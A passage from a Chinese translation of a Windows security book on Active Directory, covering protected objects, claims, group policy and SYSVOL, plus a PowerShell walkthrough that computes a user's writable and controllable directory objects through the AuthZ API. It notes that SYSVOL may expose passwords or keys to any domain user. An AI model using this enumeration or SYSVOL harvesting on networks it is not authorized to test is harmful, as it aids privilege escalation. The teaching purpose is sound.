在默认域配置中，*Administrators* 组在域控制器上获得一项特殊特权：SeEnableDelegationPrivilege 特权，该特权允许用户修改 Kerberos 委派设置。具体来说，它允许用户执行以下操作：

- 设置 TrustedForDelegation 用户账户控制标志。
- 设置 TrustedToAuthenticateForDelegation 用户账户控制标志。
- 修改用户或计算机对象的 msDS-AllowedToDelegateTo 属性。

我们将在第14章中更详细地讨论 Kerberos 委派以及这些设置的使用。

##### 受保护对象

目录的根域与整个林共享其域配置和架构，这意味着对其他域中用户的更改最终会复制到根域。但允许子域修改域配置或架构并不是一个好主意，因此服务器实现了一种保护对象免受直接修改、删除或移动的方法。

服务器并未将此保护存储为对象属性或 ACE，而是在安全描述符中将资源管理器控制标志设置为 1。技术规范将此位标志称为 SECURITY_PRIVATE_OBJECT。如果对象的安全描述符设置了此标志，并且对象位于架构或配置的命名上下文中，则除非用户的属主 SID 与执行修改的域控制器属于同一域，否则用户无法修改该对象。

例如，配置中的大多数对象由 *Enterprise Admins* 组（在根域中定义的 *通用* 组）拥有。因此，如果对象受保护，只有根域中的域控制器才能直接修改它。代码清单 11-41 包含一个简短脚本，通过检查资源管理器控制标志来搜索配置命名上下文中的受保护对象。据我所知，没有其他 Windows 功能使用这些资源管理器控制标志。




```
PS> $conf_nc = (Get-ADRootDSE).configurationNamingContext
PS> Get-ADObject -SearchBase $conf_nc -SearchScope Subtree -Filter * |
ForEach-Object {
    $sd = Get-Win32SecurityDescriptor -Name $_.DistinguishedName -Type Ds
    if ($sd.RmControl -eq 1) {
        $_.DistinguishedName
    }
}
```


*代码清单 11-41：查找受保护的配置对象*

在 Active Directory 服务器的默认安装中，代码清单 11-41 应输出无结果，因为目录不应有任何受保护对象。

这结束了我们对访问检查的讨论，尽管我们将在本章末尾的一个扩展工作示例中再次涉及它。接下来，我们将涵盖两个最后的 Active Directory 主题：用户和设备声明如何存储在目录中，以及组策略如何配置。

### 声明与中央访问策略

在前面的章节中，我们讨论了用户和设备声明、令牌如何将它们存储为安全属性，以及访问检查如何使用它们。声明对于实现中央访问策略尤为重要，正如我们在第7章中所讨论的那样。

域的Active Directory服务器存储声明和中央访问策略，并且每当用户进行身份验证或计算机同步其策略时，它都可以应用这些声明和策略。代码清单 11-42展示了如何使用`Get-ADClaimType` PowerShell命令查询Active Directory服务器以获取声明，该命令搜索`schema`类`msDS-ClaimType*`的对象。

```
PS> Get-ADClaimType -Filter {DisplayName -eq "Country"} |
Format-List ID, ValueType, SourceAttribute, AppliesToClasses
ID               : ad://ext/country
ValueType        : String
SourceAttribute  : CN=Text-Country,CN=Schema,CN=Configuration,...
AppliesToClasses : {CN=User,CN=Schema,CN=Configuration,...}
```

*代码清单 11-42：显示Country声明的属性*

在此示例中，我们发现管理员在设置域时配置了Country声明；它默认情况下不可用。此声明表示用户所在国家的名称。

我们仅展示了该对象的一些相关属性。第一个是声明的ID，用于令牌中的安全属性；在本例中，它是`ad://ext/country`。我们还显示了值的类型，用于确定要添加到令牌中的安全属性值；在本例中，它是一个字符串。

下一个属性是值的来源`schema`属性的可分辨名称。（声明可能从其他数据派生，例如用户智能卡上的值，但从`schema`属性获取声明是最简单的情况。）当用户进行身份验证时，令牌将根据其用户对象中的属性值构造声明；如果该属性未设置，则不会将声明添加到令牌中。管理员可以修改目录`schema`以添加新属性，从而派生自己的声明，例如用户的安全许可级别。

最后，我们显示了此声明适用的`schema`类列表。在本例中，列表中仅出现用户`schema`类。如果此列表包含计算机类的可分辨名称，则它将是设备声明，而不是用户声明，尽管声明可以同时适用于用户和计算机。

代码清单 11-43展示了如何显示目录中中央访问策略的属性。

```
PS> $policy = Get-ADCentralAccessPolicy -Identity "Secure Room Policy"
PS> $policy | Format-List PolicyID, Members
PolicyID : S-1-17-3260955821-1180564752-550833841-1617862776
Members  : {CN=Secure Rule,CN=Central Access Rules,CN=Claims...}

PS> $policy.Members | ForEach-Object {Get-ADCentralAccessRule -Identity $_} |
Format-List Name, ResourceCondition, CurrentAcl
Name              : Secure Rule
ResourceCondition : (@RESOURCE.EnableSecure == 1)
CurrentAcl        : D:(XA;;FA;;;WD;((@USER.ad://ext/clearance...
```

*代码清单 11-43：显示中央访问策略的属性*

管理员根据组策略配置将中央访问策略部署到域中的计算机和服务器。这允许他们选择性地将策略部署到域中特定的系统子集。但是，策略的配置存储在目录中。

该策略由两个组件组成：策略对象本身，由`msAuthz-CentralAccessPolicy` schema类表示；以及一个或多个中央访问规则，由`msAuthz-CentralAccessRule` schema类表示。

在代码清单 11-43中，我们首先使用`Get-ADCentralAccessPolicy` PowerShell命令查询名为Secure Room Policy的特定中央访问策略。从策略中，我们可以提取策略SID，用于将策略应用于资源，以及每个成员规则的可分辨名称列表。

> 注意
>
> *`Get-ADCentralAccessPolicy`命令与我在第7章中演示的`Get-CentralAccessPolicy`命令不同。前者从Active Directory服务器读取所有策略，而后者仅显示配置为在本地系统上启用的策略。*

然后，我们使用`Get-ADCentralAccessRule`命令获取每个策略规则。在此示例中，只有一个规则。我们显示其名称、用于确定何时启用规则的资源条件，以及DACL，它决定了用户在被应用规则的资源上将获得的访问级别。有关中央访问策略实现的更多信息，请参阅第5章和第7章。

### 组策略

在独立系统上，本地策略结合了LSA策略配置中的信息与定义应用程序可执行操作的多种注册表设置。在域网络中，管理员可以使用*组策略*为整个网络配置策略。加入域的计算机定期下载这些策略（通常默认每90分钟一次）。然后，计算机将这些组策略与任何现有的本地策略设置合并，以定义计算机的整体策略。

图11-6展示了域网络如何配置组策略。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure11-6.webp)

图11-6：组策略的配置

根域和任何组织单位对象都可以包含gpLink属性。*组织单位*是一个目录容器，代表组织中的某种结构。例如，管理员可以为不同办公室创建不同的组织单位，然后为这些组织单位内的计算机应用不同的策略。

gpLink属性包含应用于组织单位的组策略对象所属的域名列表。组策略对象本身并不包含实际的策略设置。相反，该对象包含一个gPCFileSysPath属性，该属性表示指向策略配置文件的文件路径，而该文件包含设置。此文件路径通常指向一个特殊的网络文件共享*SYSVOL*，其中包含配置文件。

应用哪些策略取决于计算机的账户对象存储在目录中的位置。例如，在图11-6中，管理员创建了*Servers*组织单位，然后将*CINNABAR*服务器账户添加到该容器中。该组织单位具有gpLink属性，该属性链接到Servers组策略对象。

然而，该组织单位也位于根域中，而根域有其自己的gpLink属性和分配的策略。当*CINNABAR*服务器更新其组策略时，它将在父目录层次结构中发现所有这些链接的组策略，并使用该信息来下载和应用策略。最具体的策略优先；例如，对于*CINNABAR*，Servers组策略将覆盖默认组策略中的冲突设置。服务器在创建最终策略时将合并任何不冲突的设置。

在代码清单 11-44中，我们查询Active Directory服务器上的组策略对象。




```
❶ PS> Get-ADOrganizationalUnit -Filter * -Properties gpLink |
Format-List Name, LinkedGroupPolicyObjects
Name                     : Domain Controllers
LinkedGroupPolicyObjects : {CN={6AC1786C-016F-11D2-945F-00C04fB984F9},...}

❷ PS> $policy = Get-ADObject -Filter {
    ObjectClass -eq "groupPolicyContainer" 
} -Properties *
PS> $policy | Format-List displayName, gPCFileSysPath
displayName    : Default Domain Policy
gPCFileSysPath : \\mineral.local\sysvol\mineral.local\Policies\{31B2F340-...}

displayName    : Default Domain Controllers Policy
gPCFileSysPath : \\mineral.local\sysvol\mineral.local\Policies\{6AC1786C-...}

displayName    : Default Servers Domain Policy
gPCFileSysPath : \\mineral.local\sysvol\mineral.local\Policies\{6B108F70-...}

❸ PS> ls $policy[0].gPCFileSysPath
Directory: \\mineral.local\sysvol\mineral.local\Policies\{31B2F340-016D-...}

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         3/12/2023  12:56 PM                 Adm
d-----         3/12/2023   1:02 PM                 MACHINE
d-----          4/6/2023   8:18 PM                 USER
-a----          4/6/2023   8:24 PM             22  GPT.INI

❹ PS> $dc_policy = $policy |
Where-Object DisplayName -eq "Default Domain Controllers Policy"
PS> $dc_path = $dc_policy.gPCFileSysPath
PS> Get-Content "$dc_path\MACHINE\Microsoft\Windows NT\SecEdit\GptTmpl.inf" |
Select-String "SeEnableDelegationPrivilege", "SeMachineAccountPrivilege"
❺ SeMachineAccountPrivilege = *S-1-5-11
SeEnableDelegationPrivilege = *S-1-5-32-544
```


*代码清单 11-44：查找组策略对象*

首先，我们使用Get-ADOrganizationalUnit命令查询目录中的组织单位对象，并请求gpLink属性❶。我们显示每个组织单位的名称和组策略对象列表。

我们现在可以从gpLink属性中获取组策略对象的可分辨名称，并手动查找每个对象。相反，让我们使用Get-ADObject PowerShell命令❷简单地搜索所有类为groupPolicyContainer的对象。这向我们展示了每个策略对象的名称，以及*SYSVOL*文件服务器上实际策略存储的路径。

我们还可以列出文件服务器上策略目录的内容❸。根据策略的复杂程度，文件共享可能包含许多不同的文件。组策略可以应用于特定机器，也可以基于每个用户应用，这就是为什么有单独的*MACHINE*和*USER*目录。

我们不再进一步讨论组策略的配置，但我建议在安全研究期间检查文件共享中包含的文件。组策略可以包含与域中计算机和用户配置相关的大量信息。有时，此策略配置包括用户账户的共享密码或私钥材料。由于网络上的任何用户都可以访问*SYSVOL*共享，攻击者可以提取此信息以获得网络上的额外特权。

作为信息泄露的一个小例子，你可以确定哪些安全标识符(Security Identifier, SID)会获得域控制器上的两个特殊特权：`SeMachineAccountPrivilege` 和 `SeEnableDelegationPrivilege`。分配给域控制器的组策略通常将这些特权分配信息存储在 *GptTmpl.inf* 文件中，域中的任何用户都可以访问该文件。（第10章 中讨论的 LSA 域策略远程服务也可以提供此信息，但需要管理员权限。）

在 代码清单 11-44 中，我们检索了默认域控制器策略 ❹，这是我们简单环境中应用的唯一策略。然后，我们使用简单的字符串选择从文件中提取特权。在此示例中，我们找到默认配置：*Authenticated Users* 获得 `SeMachineAccountPrivilege`，而 *BUILTIN\Administrators* 获得 `SeEnableDelegationPrivilege` ❺。

### 工作示例

在本章唯一的工作示例中，我们将逐步讲解一个脚本，该脚本用于检查用户对本地 Active Directory 服务器中所有可查找对象的访问权限。此过程相当复杂，因此我将其分为多个部分。

#### 构建授权上下文

在本章中，我们一直使用 `Get-NtGrantedAccess` 命令来对安全描述符执行访问检查。该命令在测试场景下表现良好，但在检查 Active Directory 服务器中的真实安全描述符时，会引发一个微妙的问题。

该命令使用 `NtAccessCheck` 系统调用，该调用依赖一个 Token 对象来表示用户身份。然而，Token 的组成员身份基于本地系统的 LSA 用户配置，而域控制器不太可能使用相同的组。例如，目录中的许多安全描述符将完全访问权限授予 *BUILTIN\Administrators* 组，但这些本地管理员不一定是域控制器上的管理员。

我们需要一种使用域控制器上的组来执行访问检查的方法。一种选择是在域控制器本身上运行访问检查。然而，这仅在我们对网络拥有完全控制权时才可行，而这是应尽量避免的。第二种选择是手动创建一个包含所需组的 Token，但这仍然需要提升本地特权。最后，我们可以使用自己的访问检查实现，例如我们在第 7 章中构建的那个，但这可能会引入错误行为。

我们还有另一种选择：Windows 提供了 AuthZ（授权）API，其中有一个名为 `AuthZAccessCheck` 的函数，我们可以使用它基于构造的授权上下文（而非 Token）来执行访问检查。该 API 完全在用户模式下运行，并且用户的授权上下文可以包含调用者希望的任何组。如果您不希望启用审计，这些 API 也无需提升特权即可使用。

使用 AuthZ API 而非自定义访问检查实现的一大优势在于，它与内核自身的访问检查实现共享代码，因此其结果应该是正确的。此外，Active Directory 服务器也使用相同的 API 来执行访问检查，因此在提供正确的授权上下文时，其结果应与服务器一致。

我们可以仅基于从域中提取的信息（无需管理员特权）为域用户构建授权上下文。代码清单 11-45 展示了如何构建授权上下文。

```
❶ PS> function Add-Member($Set, $MemberOf) {
    foreach($name in $MemberOf) {
        if ($Set.Add($name)) {
            $group = Get-ADGroup $name -Properties MemberOf
            Add-Member $Set $group.MemberOf
        }
    }
}

❷ PS> function Get-UserGroupMembership($User) {
    $groups = [System.Collections.Generic.HashSet[string]]::new(
        [System.StringComparer]::OrdinalIgnoreCase
    )
  ❸ Add-Member $groups $User.PrimaryGroup
    Add-Member $groups $User.MemberOf

  ❹ $auth_users = Get-ADObject -Filter {
        ObjectClass -eq "foreignSecurityPrincipal" -and Name -eq "S-1-5-11"
    } -Properties memberOf
    Add-Member $groups $auth_users.MemberOf
  ❺ $groups | ForEach-Object {Get-DsObjectSid $_}
}

PS> function Get-AuthContext($username) {
  ❻ $user = Get-ADUser -Identity $username -Properties memberOf, primaryGroup
-ErrorAction Continue
    if ($null -eq $user) {
        $user = Get-ADComputer -Identity $username -Properties memberOf,
primaryGroup
    }
    $sids = Get-UserGroupMembership $user

  ❼ $rm = New-AuthZResourceManager
  ❽ $ctx = New-AuthZContext -ResourceManager $rm -Sid $user.SID.Value
-Flags SkipTokenGroups
  ❾ Add-AuthZSid $ctx -KnownSid World
    Add-AuthZSid $ctx -KnownSid AuthenticatedUsers
    Add-AuthZSid $ctx -Sid $sids
    $rm.Dispose()
    $ctx
}

❿ PS> $ctx = Get-AuthContext "alice"
PS> $ctx.Groups
Name                                       Attributes
----                                       ----------
Everyone                                   Enabled
NT AUTHORITY\Authenticated Users           Enabled
MINERAL\Domain Users                       Enabled
BUILTIN\Users                              Enabled
BUILTIN\Pre-Windows 2000 Compatible Access Enabled
```

*代码清单 11-45：为访问检查构建授权上下文*

在目录中，用户和组对象具有一个 `memberOf` 属性，该属性列出了用户或组所属组对象的可分辨名称。我们可以利用此列表递归检查目录，以查找所有组。这就是 `Add-Member` 函数正在执行的操作 ❶。

然后，我们定义一个函数，用于从用户对象获取成员 SID 列表 ❷。我们需要添加根组，包括用户的主组 ❸ 以及 `memberOf` 属性引用的组。我们还需要添加来自域外 SID 的组。这些组以外部安全主体的形式存储。在示例中，我们找到 *Authenticated Users*（所有用户都是其成员）的条目，并添加其组成员身份 ❹。现在，我们有了组对象的可分辨名称列表，将其转换为 SID 列表，以便添加到授权上下文中 ❺。

接下来，我们构建授权上下文本身。首先查询用户对象 ❻；如果失败，则检查计算机对象并获取该账户所属的 SID 列表。然后，我们创建一个 AuthZ 资源管理器 ❼，正如其名称所示，它用于管理资源。例如，我们可以使用它在上下文之间缓存访问检查结果。

我们使用 `New-AuthZContext` 命令创建授权上下文 ❽。创建上下文时，我们需要指定 `SkipTokenGroups` 标志，以便仅将用户的 SID 添加到上下文中。否则，上下文将包含本地组列表，这违背了在域控制器上收集组的目的。

然后，我们使用 `Add-AuthZSid` 命令将组 SID 添加到上下文中 ❾，确保包含默认的 *World* 和 *Authenticated Users* 组。最后，我们测试这些函数对用户 *alice* 的行为 ❿，打印出该用户在域控制器上所属的域组列表。

远程访问检查协议

AuthZ API 还支持另一种机制，用于在拥有正确组列表的情况下执行访问检查，而无需直接在域控制器上运行代码。域中的计算机（包括域控制器）会暴露一个远程访问检查网络协议，在创建资源管理器时可以连接到该协议。

域中的普通用户无法调用该协议，因为该协议要求调用用户必须是域控制器上 `BUILTIN\Administrators` 或 `BUILTIN\Access Control Assistance Operators` 组的成员，这使其实用性有所降低。然而，您可能在不经意间就是这些组的成员，因此值得尝试连接到该服务并执行访问检查。以下命令创建了一个授权上下文，并连接到 PRIMARYDC 域控制器：

```
PS> $rm = New-AuthZResourceManager -Server PRIMARYDC.mineral.local
PS> $ctx = New-AuthZContext -ResourceManager $rm -Sid (Get-NtSid)
PS> $ctx.User
Name          Attributes
----          ----------
MINERAL\alice None

PS> $ctx.Groups
Name                                 Attributes
----                                 ------------
MINERAL\Domain Users                 Mandatory, EnabledByDefault, Enabled
Everyone                             Mandatory, EnabledByDefault, Enabled
BUILTIN\Access Control Assistance... Mandatory, EnabledByDefault, Enabled
--snip--
```

这些命令可以完全替代 代码清单 11-45。要使用远程访问检查协议，我们通过 `New-AuthZResourceManager` 命令的 `Server` 参数指定域控制器的 DNS 名称。然后，我们使用用户的 SID 创建 AuthZ 上下文。我们无需指定任何标志，因为服务将根据运行远程访问检查协议的服务器（此处为域控制器）来确定组列表。我们可以验证分配的用户和组，以确认其值基于域控制器的本地组分配。

#### 收集对象信息

有了授权上下文，我们就可以开始执行访问检查了。我们将使用 `Get-AuthZGrantedAccess` 命令，其工作方式与 `Get-NtGrantedAccess` 几乎相同，但依赖于我们创建的上下文。首先，我们需要收集要检查对象的相关信息。需要以下详细信息：

- 对象的安全描述符
- 对象 SID（如果存在），用于主体 SID
- 所有架构类，包括辅助类和子类
- 允许的架构属性和关联的属性集
- 适用的控制访问权限和写验证访问权限

代码清单 11-46 实现了 `Get-ObjectInformation` 函数，该函数根据对象的可分辨名称收集这些信息。

```
PS> function Get-ObjectInformation($Name) {
    $schema_class = Get-DsObjectSchemaClass $Name
    $sid = Get-DsObjectSid $Name
    $all_classes = Get-DsSchemaClass $schema_class.Name -Recurse -IncludeAuxiliary
    $attrs = $all_classes.Attributes | Get-DsSchemaAttribute |
Sort Name -Unique
    $infs = Get-DsSchemaClass $schema_class.Name -Inferior
    $rights = $all_classes | ForEach-Object {Get-DsExtendedRight -SchemaClass $_} | 
Sort Name -Unique
    [PSCustomObject]@{
        Name=$Name
        SecurityDescriptor=Get-Win32SecurityDescriptor -Name $Name -Type Ds
        SchemaClass=Get-DsObjectSchemaClass $Name
        Principal=$sid
        Attributes=$attrs
        Inferiors=$infs
        PropertySets=$rights | Where-Object IsPropertySet
        ControlRight=$rights | Where-Object IsControl
        ValidatedWrite=$rights | Where-Object IsValidatedWrite
    }
}
```

*代码清单 11-46：实现 Get-ObjectInformation 函数*

我们可以通过向该函数传递所需对象的可分辨名称来测试它，如 代码清单 11-47 所示。

```
PS> $dn_root = (Get-ADRootDSE).defaultNamingContext
PS> Get-ObjectInformation $dn_root
Name               : DC=mineral,DC=local
SchemaClass        : domainDNS
Principal          : S-1-5-21-146569114-2614008856-3334332795
Attributes         : {adminDescription, adminDisplayName...}
Inferiors          : {device, samServer, ipNetwork, organizationalUnit...}
PropertySets       : {Domain-Other-Parameters, Domain-Password}
ControlRight       : {Add-GUID, Change-PDC, Create-Inbound-Forest-Trust...}
ValidatedWrite     :
SecurityDescriptor : O:BAG:BAD:AI(OA;CIIO;RP;4c164200-20c0-11d0-...
```

*代码清单 11-47：收集对象信息*

在此示例中，我们请求根域对象的信息。您可以缓存返回的关于架构类的大部分信息，因为通常只有安全描述符和对象 SID 会在对象之间变化。但为简单起见，我们将在每次请求时都收集这些信息。

#### 运行访问检查

现在，我们已拥有对对象执行最大访问检查所需的一切。然而，这并非简单地将安全描述符和授权上下文传递给 AuthZ 访问检查 API 就大功告成。我们必须分别处理每种资源类型（如类、属性、控制访问权限和写验证访问权限），以确保捕获最大允许的访问权限。

代码清单 11-48 包含了运行访问检查过程的函数。为简单起见，我们将专注于捕获可能导致对象修改的访问权限。不过，您也可以轻松修改这些函数以捕获读取访问权限。

```
❶ PS> function Test-Access($Ctx, $Obj, $ObjTree, $Access) {
    Get-AuthZGrantedAccess -Context $ctx -ObjectType $ObjTree
-SecurityDescriptor $Obj.SecurityDescriptor -Principal $Obj.Principal
-Access $Access | Where-Object IsSuccess
}

PS> function Get-PropertyObjTree($Obj) {
    $obj_tree = New-ObjectTypeTree $obj.SchemaClass
  ❷ foreach($prop_set in $Obj.PropertySets) {
        Add-ObjectTypeTree $obj_tree $prop_set
    }

  ❸ $fake_set = Add-ObjectTypeTree $obj_tree -PassThru
-ObjectType "771727b1-31b8-4cdf-ae62-4fe39fadf89e"
   foreach($attr in $Obj.Attributes) {
        if (-not $attr.IsPropertySet) {
            Add-ObjectTypeTree $fake_set $attr
        }
    }
    $obj_tree
}

PS> function Get-AccessCheckResult($Ctx, $Name) {
    try {
      ❹ $obj = Get-ObjectInformation $Name
        $access = Test-Access $ctx $obj $obj.SchemaClass "MaximumAllowed" |
        Select-Object -ExpandProperty SpecificGrantedAccess

      ❺ $obj_tree = Get-PropertyObjTree $obj
        $write_attr = Test-Access $ctx $obj $obj_tree "WriteProp"
        $write_sets = $write_attr | Where-Object Level -eq 1 |
Select-Object -ExpandProperty Name
        $write_attr = $write_attr | Where-Object Level -eq 2 |
Select-Object -ExpandProperty Name

      ❻ $obj_tree = New-ObjectTypeTree
-ObjectType "771727b1-31b8-4cdf-ae62-4fe39fadf89e"
        $obj.Inferiors | Add-ObjectTypeTree -Tree $obj_tree

        $create_child = Test-Access $ctx $obj $obj_tree "CreateChild" |
Where-Object Level -eq 1 | Select-Object -ExpandProperty Name
        $delete_child = Test-Access $ctx $obj $obj_tree "DeleteChild" |
Where-Object Level -eq 1 | Select-Object -ExpandProperty Name

      ❼ $control = if ($obj.ControlRight.Count -gt 0) {
            $obj_tree = New-ObjectTypeTree -SchemaObject $obj.SchemaClass
            $obj.ControlRight | Add-ObjectTypeTree $obj_tree
            Test-Access $ctx $obj $obj_tree "ControlAccess" |
Where-Object Level -eq 1 | Select-Object -ExpandProperty Name
        }

      ❽ $write_valid = if ($obj.ValidatedWrite.Count -gt 0) {
            $obj_tree = New-ObjectTypeTree -SchemaObject $obj.SchemaClass
            $obj.ValidatedWrite | Add-ObjectTypeTree $obj_tree
            Test-Access $ctx $obj $obj_tree "Self" |
Where-Object Level -eq 1 | Select-Object -ExpandProperty Name
        }

      ❾ [PSCustomObject]@{
            Name=$Obj.Name
            Access=$access
            WriteAttributes=$write_attr
            WritePropertySets=$write_sets
            CreateChild=$create_child
            DeleteChild=$delete_child
            Control=$control
            WriteValidated=$write_valid
        }
    } catch {
        Write-Error "Error testing $Name - $_"
    }
}
```

*代码清单 11-48：运行对象访问检查*

我们首先定义几个辅助函数。第一个是 `Test-Access`，它基于授权上下文、安全描述符、对象类型树和所需访问掩码 ❶ 来运行访问检查。访问检查会为每个被检查的对象类型返回一个结果列表。我们只对成功授予某些访问权限的结果感兴趣。

下一个辅助函数是 `Get-PropertyObjTree`，它构建用于检查属性集和属性的对象类型树。树的根是对象的架构类标识符。从那里，我们首先填充所有可用的属性集 ❷。然后，我们将所有尚未包含在属性集中的剩余属性添加到一个单独的虚拟集中 ❸。

现在我们可以继续讨论多个访问检查函数。首先，我们根据对象的可分辨名称获取其信息❹。然后，我们获取对象的最大授予访问权限，仅使用对象模式类标识符作为对象类型。这让我们了解用户将获得的基本权限，例如删除对象或修改其安全描述符的能力。

接下来，我们为属性集和属性构建树❺，并使用Test-Access函数运行访问检查。我们只对授予WriteProp访问权限的结果感兴趣（大多数对象允许任何用户读取其属性，因此这些信息不太有趣）。我们将访问检查结果分为可写的属性集和可写的单个属性。

现在，我们通过从模式类标识符构建对象类型树来关注子类❻。即使目录服务器一次只检查一个类，我们也会一次性执行所有检查。我们运行两个访问检查，一个用于CreateChild访问，一个用于DeleteChild访问。

需要注意的一点是，我们使用虚拟标识符作为根对象类型。如果我们改用对象的模式类标识符，授予该类的访问权限将传播到所有子对象，可能导致错误的结果。使用一个不是真实模式类的标识符应该能避免这种情况。

我们对控制访问权限❼和写验证访问权限❽运行类似的访问检查，分别请求ControlAccess和Self。最后，我们将所有结果打包到一个自定义对象中返回给调用者❾。

代码清单 11-49演示了如何为Active Directory对象调用Get-AccessCheckResult函数。




```
PS> $dn = "CN=GRAPHITE,CN=Computers,DC=mineral,DC=local"
PS> $ctx = Get-AuthContext 'alice' ❶
PS> Get-AccessCheckResult $ctx $dn ❷
Name              : CN=GRAPHITE,CN=Computers,DC=mineral,DC=local
Access            : List, ReadProp, ListObject, ControlAccess, ReadControl
WriteAttributes   : {displayName, sAMAccountName, description, accountExpires...}
WritePropertySets : {User-Account-Restrictions, User-Logon}
CreateChild       :
DeleteChild       :
Control           : {Allowed-To-Authenticate, Receive-As, Send-As,...}
WriteValidated    : Validated-SPN

PS> $ctx = Get-AuthContext $dn
PS> Get-AccessCheckResult $ctx $dn ❸
Name              : CN=GRAPHITE,CN=Computers,DC=mineral,DC=local
Access            : CreateChild, DeleteChild, List, ReadProp, ListObject,...
WriteAttributes   : {streetAddress, homePostalAddress, assistant, info...}
WritePropertySets : {Personal-Information, Private-Information}
CreateChild       : {msFVE-RecoveryInformation, ms-net-ieee-80211-...}
DeleteChild       : {msFVE-RecoveryInformation, ms-net-ieee-80211-...}
Control           : User-Change-Password
WriteValidated    : {DS-Validated-Write-Computer, Validated-SPN}
```


*代码清单 11-49：测试Get-AccessCheckResult函数*

在这个例子中，我使用了*GRAPHITE*计算机对象，但你可以将此可分辨名称更改为目录中任何你想检查的对象。我们首先需要获取用户的身份验证上下文（这里为*alice*）❶。该用户创建了*GRAPHITE*对象，因此拥有其他用户没有的特殊访问权限。

接下来，我们运行访问检查并将结果显示到控制台❷。你可以在Access属性中看到ControlAccess已被普遍授予。这意味着*alice*可以使用任何控制访问权限，除非通过ACE明确拒绝（当用户或计算机被标记为“用户无法更改密码”时，拒绝ACE也会生效，阻止用户更改密码的控制访问权限）。

我们可以看到该用户拥有一些可写的属性和属性集，但不能创建或删除任何子对象。此外，我们还看到了授予的控制和写验证访问权限列表。控制访问权限基于顶级授予的访问权限授予，但Validated-SPN访问权限必须被明确授予。

接下来，我们使用计算机账户重复检查❸。如果你将输出与*alice*的输出进行比较，会发现几个差异。首先，用户可以写入的属性和属性集发生了变化。更重要的是，计算机账户可以创建和删除任何子对象。计算机账户还拥有更少的控制访问权限，但更多的写验证访问权限。

你可以使用Get-ADObject命令枚举本地Active Directory服务器中的所有对象，然后将每个可分辨名称传递给Get-AccessCheckResult函数，以枚举整个目录中的可写访问权限。

这结束了我们的工作示例。希望它能让你更好地理解Active Directory服务器访问检查过程的细节。如果你想探索现有的访问检查实现，NtObjectManager模块提供了Get-AccessibleDsObject命令，该命令除了检查写访问外，还检查读访问，并缓存域信息以提高性能。你可以使用它运行对当前用户的Active Directory服务器进行完整递归扫描，命令如代码清单 11-50所示。




```
PS> Get-AccessibleDsObject -NamingContext Default -Recurse
Name      ObjectClass   UserName      Modifiable Controllable
----      -----------   --------      ---------- ------------
domain    domainDNS     MINERAL\alice False      True
Builtin   builtinDomain MINERAL\alice False      False
Computers container     MINERAL\alice False      False
--snip--
```


*代码清单 11-50：执行访问检查*

表格输出指示用户是否可以修改每种类型的对象，例如更改其属性或创建子对象，以及是否已为该对象授予任何控制访问权限。

### 总结

我们以高层视角开启了这漫长的一章，概述了存储在 Active Directory 中的信息，例如域中的用户和组，并通过 PowerShell 使用远程服务器管理工具检查了目录的配置。

随后，我们深入探讨了 Active Directory 服务器，从定义目录结构的架构开始。Active Directory 服务器由分层对象组成，这些对象可以包含称为属性的命名值。每个对象和属性都有一个架构表示，定义了其可包含的内容。

接下来，我们讨论了 Active Directory 服务器如何通过强制性的安全描述符属性来保护对象。我们查看了查询现有对象安全描述符的示例，以及如何为新对象创建安全描述符。我们还了解了如何将安全描述符分配给现有对象。

一旦我们理解了对象的安全描述符如何配置，我们便探索了目录服务器如何确定用户对对象及其属性的访问权限。此访问检查过程使用架构表示中的唯一标识符来构建对象类型树。这些树使访问检查变得精细，能够仅授予用户对特定属性的访问权限，而无需数千个硬编码检查。

Active Directory 配置还包含两种特殊类型的访问权限：控制访问权限和写验证访问权限。这些权限允许用户对对象执行特殊操作，例如更改用户密码；它们还防止用户在没有服务器确认的情况下修改某些属性值。

访问检查过程也有一些例外。例如，用户可以获得 `SeMachineAccountPrivilege` 特权，这允许他们创建计算机对象，即使没有目录对象授予他们必要的权限。这使用户无需管理员账户即可将计算机加入域。然而，目录服务器限制了用户对新计算机账户的操作，以降低受损风险。

最后，我们简要概述了域如何通过链接到外部网络文件系统来配置组策略。我们注意到，这种设计可能会将域控制器上用户配置的信息泄露给没有管理访问权限的用户。

我们将在 第14章 讨论 Kerberos 身份验证时，重新回到 Active Directory 的主题。请记住，Windows 域的实际部署可能极其复杂，涉及的安全细节远不止此处所述。如果您想了解更多关于 Active Directory 的功能及其带来的许多安全边缘情况，请查阅 Microsoft 的 Active Directory 技术规范（*MS-ADTS*）。

在下一章中，我们将深入探讨 Windows 上交互式身份验证的实现。这种身份验证允许您登录桌面并使用计算机的用户界面。

## 12. 交互式身份验证

当你向Windows系统进行身份验证时，通常会访问一个登录界面，输入你的凭据，然后看到桌面。但为了让这个身份验证过程正常工作，后台其实发生了很多事情。*交互式身份验证* 是一种机制，它将一组凭据转换为令牌对象，供你与授权系统（如访问检查）交互使用。

Windows出于多种目的使用多种类型的交互式身份验证。例如，当用户创建交互式桌面时使用一种类型，而当用户向面向网络的服务提供凭据时则使用另一种类型。本章首先探讨当你向Windows系统进行身份验证时，Windows如何创建你的交互式桌面。然后，我们将介绍这种交互式身份验证如何通过LsaLogonUser API实现。最后，我们将探讨各种类型的交互式身份验证、它们之间的差异以及可能的使用场景。



### 创建用户桌面

与Windows系统交互的最常见方式是通过桌面上的用户界面。图12-1总结了创建用户桌面的过程。

![img](./image/03.PART%20III%20THE%20LOCAL%20SECURITY%20AUTHORITY%20AND%20AUTHENTICATION/Figure12-1.webp)

图12-1：交互式桌面创建概述

当Windows系统启动时，会话管理器会创建一个控制台会话，如第3章所述。在此控制台会话中，它会启动一个Winlogon进程实例，该进程负责收集凭据，并在用户通过身份验证后启动新用户的进程。随后，Winlogon进程会创建LogonUI进程来显示用户界面。LogonUI进程从用户处读取凭据，并将其传递回Winlogon ❶。

接下来，Winlogon进程将凭据发送到LSA的LsaLogonUser API以验证其正确性 ❷。如果用户成功通过身份验证，一个代表用户身份的令牌将返回给Winlogon ❸。然后，控制台会话可以为该用户重新配置，此过程包括创建窗口站和桌面，并使用用户的令牌启动用户初始化进程 ❹。

LsaLogonUser API直接支持最常见的凭据类型，即用户名和密码对。然而，Windows还允许许多其他本地身份验证因素，例如生物特征数据（如扫描用户面部）或简单的PIN码。为了处理这些情况，Winlogon会在需要时加载凭据提供程序。每个提供程序负责将其凭据类型映射为LsaLogonUser支持的凭据类型，以获取令牌。

安全注意序列

